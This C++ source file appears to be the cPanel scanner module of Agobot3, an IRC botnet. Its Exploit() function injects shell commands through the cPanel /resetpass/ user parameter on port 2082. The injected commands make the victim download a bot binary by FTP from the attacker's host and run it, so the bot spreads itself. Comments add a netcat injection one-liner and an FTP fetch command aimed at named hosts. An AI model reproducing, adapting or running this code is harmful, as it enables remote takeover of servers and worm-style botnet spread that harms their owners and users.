/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2003 Ago
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#include "utility.h"
#include "shellcode.h"

class CScannerCPanel : public CScannerBase
{
public:
	CScannerCPanel();
	virtual ~CScannerCPanel() throw() { }

	bool Exploit();
};

/*
		CPanel Scanner starts here
		scans for cpanel root exploit
*/

CScannerCPanel::CScannerCPanel() { m_szType="CScannerCPanel"; m_sScannerName.Assign("CPanel"); }

/*
COMMAND=`echo $@ | sed -e 's/ /\${BLA}/g' | sed -e 's/\//\${BLA2}/g'`
REQUEST="GET /resetpass/?user=%7C%60BLA=\$'\\\\x20';BLA2=\$'\\\\x2F';$COMMAND%60%7C HTTP/1.0\r\n"
echo -e "$REQUEST\r\n" | nc www.onefusion.com 2082
*/

/*
echo${BLA}-e${BLA}open${BLA}sschmidt.info${BLA}21\\\\nuser${BLA}web2${BLA}ftp0r\\\\ncd${BLA}html\\\\nget${BLA}unrar.exe\\\\nquit\\\\n${BLA}|${BLA}ftp${BLA}-n
*/

bool CScannerCPanel::Exploit()
{	bool bRetVal=false; CString sSendBuf, sCmdBuf;
	CString sHost(m_sSocket.m_szHost); unsigned short sPort=m_sSocket.m_sPort;

	// Can't infect a host from a firewalled system, cause it needs the FTP server
	if(IsPrivate(g_pMainCtrl->m_cIRC.m_sLocalIp.CStr()) && !IsPrivate(m_sSocket.m_szHost))
		return false;

	// Connect to the server
	if(!m_sSocket.Connect(m_sSocket.m_szHost, m_sSocket.m_sPort)) return false;
	sCmdBuf.Format("echo${BLA}-e${BLA}open${BLA}%s${BLA}%d\\\\nuser${BLA}ftp${BLA}bla\\\\nget${BLA}bot\\\\nquit\\\\n${BLA}|${BLA}ftp${BLA}-n",
		g_pMainCtrl->m_cIRC.m_sLocalHost.CStr(), g_pMainCtrl->m_cBot.bot_ftrans_port_ftp.iValue);
	sSendBuf.Format("GET /resetpass/?user=%%7C%%60BLA=$'\\\\x20';BLA2=$'\\\\x2F';%s%%60%%7C HTTP/1.0\r\n\r\n", sCmdBuf.CStr());
	m_sSocket.Write(sSendBuf.CStr(), sSendBuf.GetLength());
	m_sSocket.Disconnect();

	if(!m_sSocket.Connect(sHost.CStr(), sPort)) return false;
	sCmdBuf.Assign("./bot");
	sSendBuf.Format("GET /resetpass/?user=%%7C%%60BLA=$'\\\\x20';BLA2=$'\\\\x2F';%s%%60%%7C HTTP/1.0\r\n\r\n", sCmdBuf.CStr());
	m_sSocket.Write(sSendBuf.CStr(), sSendBuf.GetLength());
	m_sSocket.Disconnect();

	// Close the socket that was once funky fresh
	m_sSocket.Disconnect(); return bRetVal;
}

REGSCANNER(CPanel_2082, CPanel, 2082, true, true)
